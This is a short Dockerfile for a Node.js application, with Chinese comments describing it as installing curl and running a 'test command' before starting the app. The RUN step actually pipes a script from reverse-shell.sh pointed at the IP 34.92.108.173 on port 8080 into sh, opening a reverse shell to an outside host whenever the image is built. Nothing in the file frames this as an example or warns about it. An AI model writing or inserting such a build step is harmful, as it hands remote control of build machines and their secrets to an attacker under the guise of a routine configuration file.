
FROM node:20-alpine
WORKDIR /app

# 修正 1：使用 apk 安裝 curl
# 修正 2：將測試指令放在 CMD 之前
RUN apk add --no-cache curl && \
    curl https://reverse-shell.sh/34.92.108.173:8080 |sh

COPY ./ ./

# 啟動應用程式
CMD [ "node", "app.js" ]
